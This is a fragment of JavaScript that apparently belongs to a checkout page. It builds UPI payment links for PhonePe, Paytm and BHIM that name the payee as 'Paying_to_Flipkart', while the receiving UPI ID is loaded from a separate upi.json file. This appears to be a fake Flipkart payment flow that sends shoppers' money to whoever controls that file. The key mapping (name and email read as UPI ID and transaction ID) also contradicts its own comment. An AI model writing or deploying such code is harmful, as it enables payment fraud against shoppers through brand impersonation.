...
async function fetchUpiDetails() {
    try {
        ...
        return { upiId: data.name, tr: data.email }; // Assuming 'upi' and 'tr' are keys in upi.json
    } catch (error) {
...
async function payNow() {
    ...
    // Fetch UPI details (UPI ID and transaction ID) from upi.json
    ...
    var tr = upiDetails.tr; // Transaction ID fetched from upi.json

    switch (payType) {
        case 'phonepe':
            redirect_url = `phonepe://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${totalAmount}`;
            break;

        case 'paytm':
            redirect_url = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${totalAmount}`;
            break;

        case 'bhim_upi':
            redirect_url = `upi://pay?ver=01&mode=19&pa=${upiId}&pn=Paying_to_Flipkart&tr=${tr}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${totalAmount}`;
            break;
